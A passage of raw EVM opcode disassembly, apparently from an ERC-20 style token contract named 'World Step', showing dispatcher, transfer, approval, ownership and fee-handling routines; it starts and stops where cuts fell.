DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x5 PUSH1 0x0 PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x5 PUSH1 0x0 PUSH1 0xF PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH3 0x66C PUSH3 0x6E2 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD PUSH3 0x6D3 SWAP2 SWAP1 PUSH3 0x8D9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP PUSH3 0x8F6 JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x759 DUP3 PUSH3 0x713 JUMP JUMPDEST SWAP2 POP PUSH3 0x766 DUP4 PUSH3 0x713 JUMP JUMPDEST SWAP3 POP DUP3 PUSH3 0x779 JUMPI PUSH3 0x778 PUSH3 0x71D JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x7C0 DUP3 PUSH3 0x713 JUMP JUMPDEST SWAP2 POP PUSH3 0x7CD DUP4 PUSH3 0x713 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH3 0x7E3 JUMPI PUSH3 0x7E2 PUSH3 0x784 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x820 DUP3 PUSH3 0x7F3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x832 DUP2 PUSH3 0x813 JUMP JUMPDEST DUP2 EQ PUSH3 0x83E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x852 DUP2 PUSH3 0x827 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x871 JUMPI PUSH3 0x870 PUSH3 0x7EE JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH3 0x881 DUP5 DUP3 DUP6 ADD PUSH3 0x841 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH3 0x895 DUP2 PUSH3 0x813 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH3 0x8B2 PUSH1 0x0 DUP4 ADD DUP6 PUSH3 0x88A JUMP JUMPDEST PUSH3 0x8C1 PUSH1 0x20 DUP4 ADD DUP5 PUSH3 0x88A JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH3 0x8D3 DUP2 PUSH3 0x713 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0x8F0 PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0x8C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x39E4 DUP1 PUSH3 0x906 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x14F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x715018A6 GT PUSH2 0xB6 JUMPI DUP1 PUSH4 0xAAD5C023 GT PUSH2 0x6F JUMPI DUP1 PUSH4 0xAAD5C023 EQ PUSH2 0x479 JUMPI DUP1 PUSH4 0xC3C8CD80 EQ PUSH2 0x4A2 JUMPI DUP1 PUSH4 0xC492F046 EQ PUSH2 0x4B9 JUMPI DUP1 PUSH4 0xC5CC6B6A EQ PUSH2 0x4E2 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x50D JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x54A JUMPI PUSH2 0x156 JUMP JUMPDEST DUP1 PUSH4 0x715018A6 EQ PUSH2 0x37D JUMPI DUP1 PUSH4 0x758DBE03 EQ PUSH2 0x394 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x3BD JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x3E8 JUMPI DUP1 PUSH4 0xA2A957BB EQ PUSH2 0x413 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x43C JUMPI PUSH2 0x156 JUMP JUMPDEST DUP1 PUSH4 0x49BD5A5E GT PUSH2 0x108 JUMPI DUP1 PUSH4 0x49BD5A5E EQ PUSH2 0x281 JUMPI DUP1 PUSH4 0x512F65C7 EQ PUSH2 0x2AC JUMPI DUP1 PUSH4 0x59D0F713 EQ PUSH2 0x2D5 JUMPI DUP1 PUSH4 0x6D8AA8F8 EQ PUSH2 0x300 JUMPI DUP1 PUSH4 0x6FC3EAEC EQ PUSH2 0x329 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x340 JUMPI PUSH2 0x156 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x15B JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x186 JUMPI DUP1 PUSH4 0x1694505E EQ PUSH2 0x1C3 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1EE JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x219 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x256 JUMPI PUSH2 0x156 JUMP JUMPDEST CALLDATASIZE PUSH2 0x156 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x167 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x170 PUSH2 0x573 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17D SWAP2 SWAP1 PUSH2 0x2A97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x192 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1AD PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1A8 SWAP2 SWAP1 PUSH2 0x2B57 JUMP JUMPDEST PUSH2 0x5B0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1BA SWAP2 SWAP1 PUSH2 0x2BB2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1CF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1D8 PUSH2 0x5CE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1E5 SWAP2 SWAP1 PUSH2 0x2C2C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1FA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x203 PUSH2 0x5F4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x210 SWAP2 SWAP1 PUSH2 0x2C56 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x225 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x240 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x23B SWAP2 SWAP1 PUSH2 0x2C71 JUMP JUMPDEST PUSH2 0x604 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x24D SWAP2 SWAP1 PUSH2 0x2BB2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x262 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x26B PUSH2 0x6DD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x278 SWAP2 SWAP1 PUSH2 0x2CE0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x28D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x296 PUSH2 0x6E6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2A3 SWAP2 SWAP1 PUSH2 0x2D0A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2D3 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2CE SWAP2 SWAP1 PUSH2 0x2C71 JUMP JUMPDEST PUSH2 0x70C JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2E1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2EA PUSH2 0x8E5 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2F7 SWAP2 SWAP1 PUSH2 0x2D46 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x30C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x327 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x322 SWAP2 SWAP1 PUSH2 0x2D8D JUMP JUMPDEST PUSH2 0x90B JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x335 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x33E PUSH2 0xA03 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x34C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x367 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x362 SWAP2 SWAP1 PUSH2 0x2DBA JUMP JUMPDEST PUSH2 0xB18 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x374 SWAP2 SWAP1 PUSH2 0x2C56 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x389 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x392 PUSH2 0xB69 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3A0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3BB PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x3B6 SWAP2 SWAP1 PUSH2 0x2E25 JUMP JUMPDEST PUSH2 0xCBC JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3C9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3D2 PUSH2 0xED1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x3DF SWAP2 SWAP1 PUSH2 0x2D0A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3FD PUSH2 0xEFA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x40A SWAP2 SWAP1 PUSH2 0x2A97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x41F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x43A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x435 SWAP2 SWAP1 PUSH2 0x2E52 JUMP JUMPDEST PUSH2 0xF37 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x448 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x463 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x45E SWAP2 SWAP1 PUSH2 0x2B57 JUMP JUMPDEST PUSH2 0x1140 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x470 SWAP2 SWAP1 PUSH2 0x2BB2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x485 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4A0 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x49B SWAP2 SWAP1 PUSH2 0x2E25 JUMP JUMPDEST PUSH2 0x115E JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4AE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4B7 PUSH2 0x1373 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4C5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4E0 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x4DB SWAP2 SWAP1 PUSH2 0x2F1E JUMP JUMPDEST PUSH2 0x1490 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4F7 PUSH2 0x15CA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x504 SWAP2 SWAP1 PUSH2 0x2D0A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x519 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x534 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x52F SWAP2 SWAP1 PUSH2 0x2F7E JUMP JUMPDEST PUSH2 0x15F0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x541 SWAP2 SWAP1 PUSH2 0x2C56 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x556 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x571 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x56C SWAP2 SWAP1 PUSH2 0x2DBA JUMP JUMPDEST PUSH2 0x1677 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xA DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x576F726C64205374657000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5C4 PUSH2 0x5BD PUSH2 0x17C9 JUMP JUMPDEST DUP5 DUP5 PUSH2 0x17D1 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x11 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH8 0xDE0B6B3A7640000 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x611 DUP5 DUP5 DUP5 PUSH2 0x199A JUMP JUMPDEST PUSH2 0x6D2 DUP5 PUSH2 0x61D PUSH2 0x17C9 JUMP JUMPDEST PUSH2 0x6CD DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x3987 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x4 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x683 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x1F01 SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x17D1 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x9 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x14 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x77B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x772 SWAP1 PUSH2 0x3030 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x7EA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x7E1 SWAP1 PUSH2 0x30C2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP2 GT PUSH2 0x82D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x824 SWAP1 PUSH2 0x3154 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xC DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0xD DUP2 SWAP1 SSTORE POP PUSH2 0x845 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x8B0 JUMPI POP PUSH2 0x881 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST ISZERO PUSH2 0x8E0 JUMPI PUSH1 0x0 PUSH2 0x8C7 PUSH2 0x8C2 PUSH2 0xED1 JUMP JUMPDEST PUSH2 0xB18 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 GT ISZERO PUSH2 0x8DE JUMPI PUSH2 0x8DD DUP5 DUP5 DUP5 PUSH2 0x1F65 JUMP JUMPDEST JUMPDEST POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x12 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0x913 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x931 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x9A7 JUMPI POP PUSH2 0x956 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0x9E6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9DD SWAP1 PUSH2 0x31C0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x14 PUSH1 0x15 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xA44 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0xABA JUMPI POP PUSH1 0xF PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xAA2 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST DUP1 PUSH2 0xAFE JUMPI POP PUSH2 0xAC8 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xAE6 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0xB07 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP PUSH2 0xB15 DUP2 PUSH2 0x1F75 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xB62 PUSH1 0x2 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x2070 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB71 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xBFE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xBF5 SWAP1 PUSH2 0x322C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND 